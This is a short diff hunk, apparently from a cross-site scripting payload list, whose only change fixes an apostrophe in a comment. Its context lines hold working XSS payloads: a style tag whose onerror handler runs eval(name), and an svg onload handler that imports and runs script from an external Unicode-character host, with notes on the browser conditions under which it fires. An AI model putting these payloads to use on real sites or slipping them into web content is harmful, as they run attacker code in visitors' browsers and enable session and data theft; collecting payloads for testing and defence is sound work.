@@ -43,7 +43,7 @@
 <!-- If inline styles are blocked -->
 <style/onerror=eval(name)>
 
-<!-- Uses external script as import, doesn't work in innerHTML unless Firefox -->
+<!-- Uses external script as import, doesnt work in innerHTML unless Firefox -->
 <!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
 <svg/onload=import(/\\Ǌ.₨/)>
 
